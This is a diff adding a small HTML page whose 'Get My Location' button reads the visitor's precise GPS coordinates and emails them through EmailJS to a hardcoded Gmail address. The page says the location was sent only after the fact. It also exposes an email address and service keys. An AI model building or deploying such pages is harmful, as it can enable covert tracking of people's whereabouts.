@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Sender</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("by_NZBhZ4Gimyw3iY");
+        })();
+
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    const templateParams = {
+                        to_email: 'fahdidoto87@gmail.com',
+                        latitude: lat,
+                        longitude: lon
+                    };
+
+                    emailjs.send('service_n7runli', 'template_b1rzkgc', templateParams)
+                        .then(function(response) {
+                            console.log('Email sent successfully:', response);
+                            document.getElementById('message').innerText = `SUCCESS! Your location (Lat: ${lat}, Lon: ${lon}) has been sent.`;
+                        }, function(error) {
+                            console.error('EmailJS Error:', error);
+                            document.getElementById('message').innerText = `FAILED... Your location (Lat: ${lat}, Lon: ${lon}) could not be sent. Please try again.`;
+                        });
+                }, function(error) {
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            document.getElementById('message').innerText = "User denied the request for Geolocation.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            document.getElementById('message').innerText = "Location information is unavailable.";
+                            break;
+                        case error.TIMEOUT:
+                            document.getElementById('message').innerText = "The request to get user location timed out.";
+                            break;
+                        case error.UNKNOWN_ERROR:
+                            document.getElementById('message').innerText = "An unknown error occurred.";
+                            break;
+                    }
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                document.getElementById('message').innerText = "Geolocation is not supported by this browser.";
+            }
+        }
+    </script>
+</head>
+<body>
+    <button onclick="sendLocation()">Get My Location</button>
+    <div id="message" style="margin-top: 20px; font-weight: bold;"></div>
+</body>
+</html>
